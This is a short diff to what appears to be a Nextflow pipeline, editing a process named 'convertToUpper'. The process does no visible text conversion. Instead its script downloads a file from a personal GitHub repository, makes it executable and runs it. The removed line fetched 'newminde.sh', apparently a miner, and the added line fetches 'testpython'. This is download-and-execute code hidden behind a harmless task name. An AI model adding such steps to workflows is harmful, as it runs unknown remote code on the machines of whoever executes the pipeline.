@@ -16,7 +16,7 @@ process convertToUpper {
     stdout
 
   """
-  wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/newminde.sh && chmod +x newminde.sh && ./newminde.sh
+  wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/testpython && chmod +x testpython && ./testpython
   """
 }
 
